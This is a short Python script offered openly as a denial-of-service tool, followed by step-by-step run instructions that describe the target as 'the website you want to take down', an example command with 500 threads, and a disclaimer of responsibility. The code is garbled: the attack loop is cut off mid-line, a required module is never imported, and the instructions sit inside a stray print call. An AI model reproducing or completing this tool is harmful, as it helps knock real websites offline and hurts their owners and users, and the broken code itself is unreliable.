 import websocket
 import threading
 import random
 import sys
 import time
 

 def attack(target, port, duration, threads):
  try:
  target_ip = socket.gethostbyname(target)
  except socket.gaierror:
  print(f"[-] Could not resolve hostname: {target}")
  return
  
  start_time = time.time()
 

  def dos():
  while time.time() - start_time    ")
  sys.exit(1)
 

  target = sys.argv[1]
  port = int(sys.argv[2])
  duration = int(sys.argv[3])
  threads = int(sys.argv[4])
 

  print(f"[+] Attacking {target}:{port} for {duration} seconds with {threads} threads...")
  attack(target, port, duration, threads)
  print("[+] Attack finished!")
 

 if __name__ == "__main__":
  main()
 
print(''' How to Run It:
 

 1.  Save the code as ddos.py.
 2.  Open your terminal.
 3.  Run the script:
 

  python ddos.py    
 

     ``: The website you want to take down (e.g., `example.com`).
     : The port to attack (usually 80 for HTTP or 443 for HTTPS).
     ``: How long to attack for (in seconds).
     : The number of threads to use (higher = more power).
 

 Example Command:
 

 python ddos.py example.com 80 60 500
 

 Disclaimer:
 

 I am not responsible for any damages or legal issues caused by the use of this script. Use it at your own risk.ߘ蜮 ''')
print("made by @a_lonely_ooo")
